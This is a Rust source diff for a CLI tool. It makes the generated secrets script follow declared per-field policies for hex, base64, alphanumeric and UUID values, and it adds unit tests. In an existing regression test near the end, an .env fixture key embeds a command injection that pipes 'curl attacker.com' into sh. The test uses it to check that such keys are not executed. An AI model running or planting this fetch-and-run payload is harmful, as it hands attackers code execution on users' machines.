@@ -1462,7 +1462,8 @@ pub fn generate_config_from_github(
             let scripts_dir = project_dir.join("scripts");
             std::fs::create_dir_all(&scripts_dir).ok();
             let script_path = scripts_dir.join("generate-secrets.sh");
-            let script_content = generate_secrets_script_content(&env_content);
+            let field_policies = flatten_generated_field_policies(&config.config_contract);
+            let script_content = generate_secrets_script_content(&env_content, &field_policies);
             std::fs::write(&script_path, &script_content).map_err(|e| {
                 CliError::ConfigValidation(format!(
                     "Failed to write scripts/generate-secrets.sh: {}",
@@ -1943,9 +1944,61 @@ pub fn generate_env_example_content(
     lines.join("\n")
 }
 
-/// Generate `scripts/generate-secrets.sh` content that uses `openssl rand -hex`
-/// to fill missing secret values in `.env`.
-pub fn generate_secrets_script_content(env_file_content: &str) -> String {
+/// Flatten a `config_contract`'s `mutability: generated` field policies into
+/// one name -> policy map, matching the level of granularity already used
+/// for `env_vars` at this call site (merged across `app` + all `services`,
+/// without per-service disambiguation). Last write wins on name collisions.
+pub fn flatten_generated_field_policies(
+    contract: &crate::cli::config_parser::ConfigContract,
+) -> HashMap<String, crate::cli::config_parser::FieldPolicy> {
+    let mut policies = HashMap::new();
+    for target in contract.services.values() {
+        for (key, policy) in &target.fields {
+            if policy.mutability == crate::cli::config_parser::Mutability::Generated {
+                policies.insert(key.clone(), policy.clone());
+            }
+        }
+    }
+    policies
+}
+
+/// The shell subshell expression (without the surrounding `$( ... )`) that
+/// generates a value matching `policy`, or `None` when the policy can't be
+/// satisfied by a local shell script (e.g. `derived_jwt`, which needs a
+/// signing key + JWT library — left to the app's own auth bootstrap).
+fn generator_shell_expression(policy: &crate::cli::config_parser::FieldPolicy) -> Option<String> {
+    use crate::cli::config_parser::FieldType;
+
+    match policy.type_spec {
+        Some(FieldType::Hex) => {
+            let bytes = policy.length.map(|len| len.div_ceil(2)).unwrap_or(16);
+            Some(format!("openssl rand -hex {bytes}"))
+        }
+        Some(FieldType::Base64) => {
+            let bytes = policy.length.unwrap_or(24);
+            Some(format!("openssl rand -base64 {bytes} | tr -d '\\n'"))
+        }
+        Some(FieldType::Alphanumeric) | None => {
+            let chars = policy.min_length.unwrap_or(32);
+            Some(format!(
+                "LC_ALL=C tr -dc 'A-Za-z0-9' < /dev/urandom | head -c {chars}"
+            ))
+        }
+        Some(FieldType::Uuid) => Some("uuidgen".to_string()),
+        Some(FieldType::DerivedJwt) | Some(FieldType::Enum) => None,
+    }
+}
+
+/// Generate `scripts/generate-secrets.sh` content that fills missing secret
+/// values in `.env`. Uses the declared `mutability: generated` policy for a
+/// key when one exists in `field_policies` (type/length-aware); falls back
+/// to the historical `openssl rand -hex 16` default for undeclared
+/// secret-looking keys, so existing projects without a `config_contract`
+/// keep working unchanged.
+pub fn generate_secrets_script_content(
+    env_file_content: &str,
+    field_policies: &HashMap<String, crate::cli::config_parser::FieldPolicy>,
+) -> String {
     let mut lines = vec![
         "#!/bin/bash".to_string(),
         "set -euo pipefail".to_string(),
@@ -1971,7 +2024,25 @@ pub fn generate_secrets_script_content(env_file_content: &str) -> String {
             continue;
         }
 
-        if value.is_empty() && is_secret_env_key(key) {
+        // A key with an explicit `mutability: generated` policy is always
+        // generated regardless of its name; otherwise fall back to the
+        // name-based heuristic (today's behavior for undeclared fields).
+        if value.is_empty() && (field_policies.contains_key(key) || is_secret_env_key(key)) {
+            let generator = match field_policies.get(key) {
+                Some(policy) => match generator_shell_expression(policy) {
+                    Some(expr) => expr,
+                    None => {
+                        lines.push(format!(
+                            r#"echo ":: Skipping {} — derived/enum value, set it manually or via app bootstrap.""#,
+                            key
+                        ));
+                        lines.push(String::new());
+                        continue;
+                    }
+                },
+                None => "openssl rand -hex 16".to_string(),
+            };
+
             lines.push(format!(r#"echo ":: Generating {}...""#, key));
             lines.push(format!(
                 r#"CURRENT=$(grep "^{}=" .env 2>/dev/null | cut -d= -f2- || true)"#,
@@ -1979,8 +2050,8 @@ pub fn generate_secrets_script_content(env_file_content: &str) -> String {
             ));
             lines.push(format!(r#"if [ -z "$CURRENT" ]; then"#));
             lines.push(format!(
-                r#"  sed -i'.bak' "s/^{}=.*/{}=$(openssl rand -hex 16)/" .env 2>/dev/null || sed -i '' "s/^{}=.*/{}=$(openssl rand -hex 16)/" .env"#,
-                key, key, key, key
+                r#"  sed -i'.bak' "s/^{}=.*/{}=$({})/" .env 2>/dev/null || sed -i '' "s/^{}=.*/{}=$({})/" .env"#,
+                key, key, generator, key, key, generator
             ));
             lines.push(format!(r#"fi"#));
             lines.push(String::new());
@@ -2813,12 +2884,122 @@ mod tests {
     #[test]
     fn test_generate_secrets_script_only_missing_vars() {
         let env_file = "DB_PASSWORD=\nAPI_KEY=\nREDIS_PASSWORD=already_set\n";
-        let script = generate_secrets_script_content(env_file);
+        let script = generate_secrets_script_content(env_file, &HashMap::new());
         assert!(script.contains("DB_PASSWORD"));
         assert!(script.contains("API_KEY"));
         // Already-set secret should NOT appear in generation commands
         // (it's already filled, no need to regenerate)
         assert!(!script.contains("REDIS_PASSWORD"));
+    }
+
+    #[test]
+    fn test_generate_secrets_script_uses_declared_hex_length() {
+        let env_file = "JWT_SECRET=\n";
+        let mut policies = HashMap::new();
+        policies.insert(
+            "JWT_SECRET".to_string(),
+            crate::cli::config_parser::FieldPolicy {
+                mutability: crate::cli::config_parser::Mutability::Generated,
+                required: true,
+                type_spec: Some(crate::cli::config_parser::FieldType::Hex),
+                length: Some(32),
+                min_length: None,
+                values: Vec::new(),
+                signing_key: None,
+                claims: None,
+                alg: None,
+            },
+        );
+        let script = generate_secrets_script_content(env_file, &policies);
+        // length: 32 means a 32-char hex string -> 16 random bytes.
+        assert!(
+            script.contains("openssl rand -hex 16"),
+            "should derive byte count from declared hex length: {script}"
+        );
+    }
+
+    #[test]
+    fn test_generate_secrets_script_uses_declared_alphanumeric_min_length() {
+        let env_file = "DASHBOARD_PASSWORD=\n";
+        let mut policies = HashMap::new();
+        policies.insert(
+            "DASHBOARD_PASSWORD".to_string(),
+            crate::cli::config_parser::FieldPolicy {
+                mutability: crate::cli::config_parser::Mutability::Generated,
+                required: true,
+                type_spec: Some(crate::cli::config_parser::FieldType::Alphanumeric),
+                length: None,
+                min_length: Some(20),
+                values: Vec::new(),
+                signing_key: None,
+                claims: None,
+                alg: None,
+            },
+        );
+        let script = generate_secrets_script_content(env_file, &policies);
+        assert!(
+            script.contains("head -c 20") || script.contains("-c20"),
+            "should derive char count from declared min_length: {script}"
+        );
+    }
+
+    #[test]
+    fn test_generate_secrets_script_uses_uuid_generator() {
+        let env_file = "INSTANCE_ID=\n";
+        let mut policies = HashMap::new();
+        policies.insert(
+            "INSTANCE_ID".to_string(),
+            crate::cli::config_parser::FieldPolicy {
+                mutability: crate::cli::config_parser::Mutability::Generated,
+                required: true,
+                type_spec: Some(crate::cli::config_parser::FieldType::Uuid),
+                length: None,
+                min_length: None,
+                values: Vec::new(),
+                signing_key: None,
+                claims: None,
+                alg: None,
+            },
+        );
+        let script = generate_secrets_script_content(env_file, &policies);
+        assert!(
+            script.contains("uuidgen"),
+            "uuid policy should use uuidgen: {script}"
+        );
+    }
+
+    #[test]
+    fn test_generate_secrets_script_skips_derived_jwt_fields() {
+        let env_file = "ANON_KEY=\n";
+        let mut policies = HashMap::new();
+        policies.insert(
+            "ANON_KEY".to_string(),
+            crate::cli::config_parser::FieldPolicy {
+                mutability: crate::cli::config_parser::Mutability::Generated,
+                required: true,
+                type_spec: Some(crate::cli::config_parser::FieldType::DerivedJwt),
+                length: None,
+                min_length: None,
+                values: Vec::new(),
+                signing_key: Some("auth.JWT_SECRET".to_string()),
+                claims: Some(serde_json::json!({"role": "anon"})),
+                alg: Some("HS256".to_string()),
+            },
+        );
+        let script = generate_secrets_script_content(env_file, &policies);
+        // Local shell script can't sign JWTs; must not fabricate a random value.
+        assert!(
+            !script.contains("ANON_KEY=$(openssl") && !script.contains("ANON_KEY=$(uuidgen"),
+            "derived_jwt fields must not be randomly generated locally: {script}"
+        );
+    }
+
+    #[test]
+    fn test_generate_secrets_script_falls_back_to_default_when_undeclared() {
+        // No policy declared for this key -> today's default behavior.
+        let env_file = "LEGACY_SECRET=\n";
+        let script = generate_secrets_script_content(env_file, &HashMap::new());
+        assert!(script.contains("openssl rand -hex 16"));
     }
 
     // ── choose_primary_app edge cases ────────────────
@@ -2931,7 +3112,7 @@ mod tests {
         // Bug: keys containing $(...) are interpolated verbatim into bash
         // double-quoted strings, enabling shell injection.
         let env_file_content = "DB_$(curl attacker.com|sh)_SECRET=\nNORMAL_SECRET=\n";
-        let script = generate_secrets_script_content(env_file_content);
+        let script = generate_secrets_script_content(env_file_content, &HashMap::new());
 
         // The malicious key must NOT appear in the script in a form that
         // would be executed (i.e. the subshell expansion must be absent).
